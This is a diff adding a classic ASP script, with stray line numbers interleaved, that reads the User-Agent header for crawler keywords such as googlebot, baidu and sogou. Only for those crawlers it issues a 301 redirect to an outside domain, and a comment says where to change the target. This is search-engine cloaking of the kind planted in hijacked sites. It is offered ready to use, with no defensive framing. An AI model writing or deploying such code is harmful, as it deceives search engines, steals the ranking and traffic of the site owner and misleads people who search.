@@ -1,0 +1,77 @@
+<%
+02
+Function GetLocationURL()
+03
+Dim Url
+04
+Dim ScriptName,QueryString
+05
+ScriptName = Request.ServerVariables("SCRIPT_NAME")
+06
+QueryString = Request.ServerVariables("QUERY_STRING")
+07
+if ScriptName = "/index.asp" then
+08
+    if QueryString = "" then
+09
+        GetLocationURL = "/"
+10
+    else
+11
+        GetLocationURL = ScriptName&"?"&QueryString
+12
+    end if
+13
+else
+14
+    if QueryString = "" then
+15
+        GetLocationURL = ScriptName
+16
+    else
+17
+        GetLocationURL = ScriptName&"?"&QueryString 
+18
+    end if
+19
+end if
+20
+  
+21
+End Function
+22
+   
+23
+If isspider() then
+24
+    Response.Status="301 Moved Permanently"
+25
+    Response.AddHeader "Location","http://wzjc.chinacycc.com"& GetLocationURL() '在这里修改要跳转到的网页
+26
+    Response.End
+27
+End if
+28
+   
+29
+function isspider()
+30
+dim agent,searray,i
+31
+agent="agent:"&LCase(request.servervariables("http_user_agent"))
+32
+searray=array("googlebot","spider","sogou","yahoo","soso","baidu","360")
+33
+isspider = false
+34
+for i=0 to ubound(searray)
+35
+ if (instr(agent,searray(i))>0) then isspider=true
+36
+next
+37
+end function
+38
+   
+39
+%>
